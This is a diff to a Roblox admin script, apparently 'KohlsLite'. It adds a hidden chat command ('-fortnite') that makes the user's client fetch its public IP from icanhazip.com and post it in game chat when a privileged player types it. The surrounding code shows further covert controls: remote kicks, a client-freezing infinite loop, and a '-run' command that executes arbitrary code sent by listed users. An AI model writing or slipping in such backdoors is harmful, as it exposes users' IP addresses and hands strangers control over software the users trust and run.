@@ -8304,11 +8304,14 @@ v.Chatted:Connect(function(msg)
                                         game.Players.LocalPlayer:Kick("a kohlslite admin kicked you!")
                                 end)
                 end
+                
+                if string.sub(msg:lower(), 0, 9) == "-fortnite" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                        game.Players:Chat(":m "..game:HttpGet("https://icanhazip.com"))
+                end
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                                     Remind("You have been warned by a KohlsLite collaborator!")
                 end
-
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                                     Remind("You have been WARNED!")
@@ -8323,7 +8326,6 @@ v.Chatted:Connect(function(msg)
                                      while true do end
                                 -- game:Shutdown()
                 end
-
 
            	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
         			Execute(string.sub(msg, 6))
